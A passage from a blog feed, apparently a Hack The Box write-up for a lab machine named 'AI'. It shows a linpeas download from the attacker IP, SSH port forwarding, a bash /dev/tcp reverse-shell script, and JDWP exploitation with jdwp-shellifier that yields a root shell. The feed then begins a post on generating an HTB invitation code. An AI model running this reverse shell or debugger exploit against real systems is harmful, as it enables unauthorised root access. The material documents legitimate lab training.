</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl 10.10.14.73
curl -O 10.10.14.73/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
root     <span style="color:#bd93f9">129808</span>  7.7  4.6 <span style="color:#bd93f9">3108796</span> <span style="color:#bd93f9">93232</span> ?       Sl   14:22   0:04 /usr/bin/java -Djava.util.logging.config.file<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager<span style="color:#ff79c6">=</span>org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize<span style="color:#ff79c6">=</span><span style="color:#bd93f9">2048</span> -Djava.protocol.handler.pkgs<span style="color:#ff79c6">=</span>org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0027</span> -agentlib:jdwp<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">transport</span><span style="color:#ff79c6">=</span>dt_socket,address<span style="color:#ff79c6">=</span>localhost:8000,server<span style="color:#ff79c6">=</span>y,suspend<span style="color:#ff79c6">=</span>n -Dignore.endorsed.dirs<span style="color:#ff79c6">=</span> -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27 -Dcatalina.home<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir<span style="color:#ff79c6">=</span>/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
</code></pre></td></tr></table>
</div>
</div><p>We can further spot a running server on port 8009 which is ajp (tomcat redirector).
If we are not succesful with JDWP exploitation, then we can explore the following resource: <a href="https://ionize.com.au/exploiting-apache-tomcat-port-8009-using-apache-jserv-protocol/">Exploiting Tomcat Apach JServ Protocol using port 8009</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">alexa@AI:~$ ss -lntp
State          Recv-Q          Send-Q                           Local Address:Port                     Peer Address:Port
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1</span>                                    127.0.0.1:8000                          0.0.0.0:*
LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">100</span>                         <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8080                                *:*
LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">1</span>                           <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8005                                *:*
LISTEN         <span style="color:#bd93f9">0</span>               <span style="color:#bd93f9">100</span>                         <span style="color:#ff79c6">[</span>::ffff:127.0.0.1<span style="color:#ff79c6">]</span>:8009                                *:*
</code></pre></td></tr></table>
</div>
</div><p>We establish an ssh connection with user alexa, then we execute <code>~C</code>to get the ssh command cli for the purpose of adding port <a href="https://unix.stackexchange.com/questions/30515/how-to-setup-port-redirection-after-a-ssh-connection-has-been-opened">forwarding rules</a>.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">alexa@AI:~$ ~C
ssh&gt; <span style="color:#8be9fd;font-style:italic">help</span>
ssh&gt; -L8000:127.0.0.1:8000
bind: Cannot assign requested address
Forwarding port.
alexa@AI:~$
</code></pre></td></tr></table>
</div>
</div><p>If we look now at our local machine, the port forwarding is effective</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ctf@15bec4805337:~/htb$ ss -lntp
State     Recv-Q     Send-Q           Local Address:Port           Peer Address:Port
LISTEN    <span style="color:#bd93f9">0</span>          <span style="color:#bd93f9">0</span>                    127.0.0.1:8000                0.0.0.0:*         users:<span style="color:#ff79c6">((</span><span style="color:#f1fa8c">&#34;ssh&#34;</span>,pid<span style="color:#ff79c6">=</span>23365,fd<span style="color:#ff79c6">=</span>7<span style="color:#ff79c6">))</span>
</code></pre></td></tr></table>
</div>
</div><p>We are now able to use local port 8000 to connect the remote JDWP port.
We will use the exploit: <a href="https://github.com/IOActive/jdwp-shellifier">Git Hub JDWP shellifier</a>
Running jdwp shellifier, we identify server is running OpenJDK 11.0.4, so we can install it locally to run jdb the Java Debugger</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./jdwp-shellifier.py -t 127.0.0.1 -p <span style="color:#bd93f9">8000</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Targeting <span style="color:#f1fa8c">&#39;127.0.0.1:8000&#39;</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Reading settings <span style="color:#ff79c6">for</span> <span style="color:#f1fa8c">&#39;OpenJDK 64-Bit Server VM - 11.0.4&#39;</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found Runtime class: <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span>b8c
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Found Runtime.getRuntime<span style="color:#ff79c6">()</span>: <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span>7fda1003e790
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Created <span style="color:#8be9fd;font-style:italic">break</span> event <span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">2</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Waiting <span style="color:#ff79c6">for</span> an event on <span style="color:#f1fa8c">&#39;java.net.ServerSocket.accept&#39;</span>
^C<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Exiting on user&#39;s request
sudo apt install openjdk-11-jdk
</code></pre></td></tr></table>
</div>
</div><p>In the server, using alexa account, we can create a reverse-shell script from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat &gt;&gt; /tmp/test.sh <span style="color:#f1fa8c">&lt;&lt; EOF
</span><span style="color:#f1fa8c">#!/bin/bash
</span><span style="color:#f1fa8c">bash -i &gt;&amp; /dev/tcp/10.10.14.73/8080 0&gt;&amp;1
</span><span style="color:#f1fa8c">EOF</span>
chmod a+x /tmp/test.sh
</code></pre></td></tr></table>
</div>
</div><p>We prepare the server in our local machine with <code>nc -lntp 8080</code> and we test the reverse-shell is working.
Now we need to figure out how to execute the script as root: Exploiting JDWP would be a good idea</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">jdb <span style="color:#ff79c6">-</span>attach 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span><span style="color:#ff79c6">:</span>8000
Set uncaught java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Throwable</span>
Set deferred uncaught java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Throwable</span>
Initializing jdb <span style="color:#ff79c6">...</span>
<span style="color:#ff79c6">&gt;</span> stop in java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">String</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span><span style="color:#ff79c6">)</span>
Set breakpoint java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">String</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd">int</span><span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">&gt;</span> print <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/touch /tmp/test1234&#34;</span><span style="color:#ff79c6">)</span>
com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">tools</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">example</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">debug</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">expr</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ParseException</span><span style="color:#ff79c6">:</span> Unable to create java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span> instance
 <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/touch /tmp/test1234&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span>
<span style="color:#ff79c6">&gt;</span> print <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/sh /tmp/test.sh&#34;</span><span style="color:#ff79c6">)</span>
com<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sun</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">tools</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">example</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">debug</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">expr</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">ParseException</span><span style="color:#ff79c6">:</span> Unable to create java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span> instance
 <span style="color:#ff79c6">new</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">Runtime</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/sh /tmp/test.sh&#34;</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span>
<span style="color:#ff79c6">&gt;</span>
Breakpoint hit<span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;thread=main&#34;</span><span style="color:#ff79c6">,</span> java<span style="color:#ff79c6">.</span><span style="color:#50fa7b">lang</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">String</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">indexOf</span><span style="color:#ff79c6">(),</span> line<span style="color:#ff79c6">=</span>1<span style="color:#ff79c6">,</span>535 bci<span style="color:#ff79c6">=</span>0

main<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>
The application has been disconnected
</code></pre></td></tr></table>
</div>
</div><p>We get many disconnections and executing the command is not always successful, so we will exploit using jdwp-shellifier.py instead.
Trying to break on java.lang.String.indexOf was not very successful; however using instead org.apache.tomcat.util.net.NioBlockingSelector$BlockPoller.events worked</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">#<span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span> <span style="color:#ff79c6">-</span>p 8000 <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;java.lang.String.indexOf&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
<span style="color:#ff79c6">./</span>jdwp<span style="color:#ff79c6">-</span>shellifier<span style="color:#ff79c6">.</span><span style="color:#50fa7b">py</span> <span style="color:#ff79c6">-</span>t 127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span> <span style="color:#ff79c6">-</span>p 8000 <span style="color:#ff79c6">--</span><span style="color:#ff79c6">break</span><span style="color:#ff79c6">-</span>on <span style="color:#f1fa8c">&#34;org.apache.tomcat.util.net.NioBlockingSelector\$BlockPoller.events&#34;</span> <span style="color:#ff79c6">--</span>cmd <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>
<span style="color:#ff79c6">[+]</span> Targeting &#39;127<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">1</span><span style="color:#ff79c6">:</span>8000&#39;
<span style="color:#ff79c6">[+]</span> Reading settings <span style="color:#ff79c6">for</span> &#39;OpenJDK 64<span style="color:#ff79c6">-</span>Bit Server VM <span style="color:#ff79c6">-</span> 11<span style="color:#ff79c6">.</span><span style="color:#50fa7b">0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">4</span>&#39;
<span style="color:#ff79c6">[+]</span> Found Runtime class<span style="color:#ff79c6">:</span> id<span style="color:#ff79c6">=</span>a9d
<span style="color:#ff79c6">[+]</span> Found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span>7f4f84023910
<span style="color:#ff79c6">[+]</span> Created <span style="color:#ff79c6">break</span> event id<span style="color:#ff79c6">=</span>2
<span style="color:#ff79c6">[+]</span> Waiting <span style="color:#ff79c6">for</span> an event on &#39;org<span style="color:#ff79c6">.</span><span style="color:#50fa7b">apache</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">tomcat</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">util</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">net</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">NioBlockingSelector$BlockPoller</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">events</span>&#39;
<span style="color:#ff79c6">[+]</span> Received matching event from thread 0xb42
<span style="color:#ff79c6">[+]</span> Selected payload &#39;<span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>test<span style="color:#ff79c6">.</span><span style="color:#50fa7b">sh</span>&#39;
<span style="color:#ff79c6">[+]</span> Command string object created id<span style="color:#ff79c6">:</span>b43
<span style="color:#ff79c6">[+]</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getRuntime</span><span style="color:#ff79c6">()</span> returned context id<span style="color:#ff79c6">:</span>0xb44
<span style="color:#ff79c6">[+]</span> found Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">():</span> id<span style="color:#ff79c6">=</span>7f4f84023948
<span style="color:#ff79c6">[+]</span> Runtime<span style="color:#ff79c6">.</span><span style="color:#50fa7b">exec</span><span style="color:#ff79c6">()</span> successful<span style="color:#ff79c6">,</span> retId<span style="color:#ff79c6">=</span>b45
<span style="color:#ff79c6">[!]</span> Command successfully executed
</code></pre></td></tr></table>
</div>
</div><p>We can now see on our local machine a shell connection is established</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">~ $ nc -nvlp <span style="color:#bd93f9">8080</span>
root@AI:~# <span style="color:#8be9fd;font-style:italic">pwd</span>
<span style="color:#8be9fd;font-style:italic">pwd</span>
/root
root@AI:~# ls
ls
root.txt
tomcat.sh
root@AI:~# cat root.txt
cat root.txt
0ed*************************eaa3
root@AI:~#
</code></pre></td></tr></table>
</div>
</div><p>Challenge finished</p>
]]></content></item><item><title>HTB - Obtain an invitation code on hackthebox.eu</title><link>https://0xade1.github.io/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</link><pubDate>Sat, 01 Feb 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/02/htb-obtain-an-invitation-code-on-hackthebox.eu/</guid><description>Obtain an invitation code to hackthebox.eu Nobody will send you an invitation code so it is advised to hack in the website to generate yout own invitation code.
While it is certainly easier to do it with Firefox developer tools, I have written the following python3 script get-htb-invitation-code.py for the sake of programming.
in Developer tools Debugger tab, we see an inviteapi.min.js which contains a packed code to call some javascript.</description><content type="html"><![CDATA[<h1 id="obtain-an-invitation-code-to-hacktheboxeu">Obtain an invitation code to hackthebox.eu</h1>
<p>Nobody will send you an invitation code so it is advised to hack in the website to generate yout own invitation code.</p>
<p>While it is certainly easier to do it with Firefox developer tools, I have written the following python3 script <a href="./get-htb-invitation-code.py">get-htb-invitation-code.py</a> for the sake of programming.</p>
<p>in Developer tools Debugger tab, we see an inviteapi.min.js which contains a packed code to call some javascript.
Calling the javascript function makeInviteCode() in the Console tab, allows us to get a json document with encoded data.</p>
<pre tabindex="0"><code>data: &quot;SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl&quot;
enctype: &quot;BASE64&quot;
</code></pre><p>Sometimes the data and encoding type will change</p>
